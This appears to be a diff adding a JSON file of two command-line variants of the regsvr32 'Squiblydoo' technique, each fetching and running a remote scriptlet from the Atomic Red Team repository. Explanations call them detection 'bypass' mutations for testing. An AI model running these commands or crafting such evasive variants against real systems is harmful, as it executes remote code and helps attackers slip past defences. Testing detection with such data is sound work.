@@ -1,0 +1,10 @@
+[
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe /s /u -i https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",
+    "explanation": "The original command uses '/i:' syntax for the URL. This bypass substitutes '/i:' with '-i' (equivalent syntax) and removes the colon after '-i' while maintaining the same behavior. This is a safe mutation for testing purposes."
+  },
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe  /s /u /i https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",
+    "explanation": "The original command uses '/i:' syntax for the URL. This bypass removes the colon after '/i' while keeping the same functionality. This is a safe mutation for testing purposes."
+  }
+]
